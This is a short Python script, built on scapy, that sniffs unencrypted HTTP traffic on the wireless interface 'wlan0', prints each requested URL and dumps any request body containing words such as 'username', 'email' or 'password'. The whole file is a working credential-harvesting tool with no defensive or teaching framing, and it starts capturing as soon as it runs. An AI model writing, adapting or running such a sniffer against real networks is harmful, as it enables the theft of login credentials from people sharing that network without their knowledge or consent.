import scapy.all as scapy
from scapy.layers import http

def sniffing(interface):
    scapy.sniff(iface = interface, store = False, prn = process_sniffed)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_uname_pass(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ['username', 'user', 'login', 'e-mail', 'email', 'pass', 'password']
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed(packet):
    if packet.haslayer(http.HTTPRequest):
        url = str(get_url(packet))
        print('[+] Possible urls >> ' + url)
        uname_pass = str(get_uname_pass(packet))
        if uname_pass:
            print('\n\n\n[+] Possible UserID and Pass : ' + uname_pass + '\n\n\n')


sniffing('wlan0')
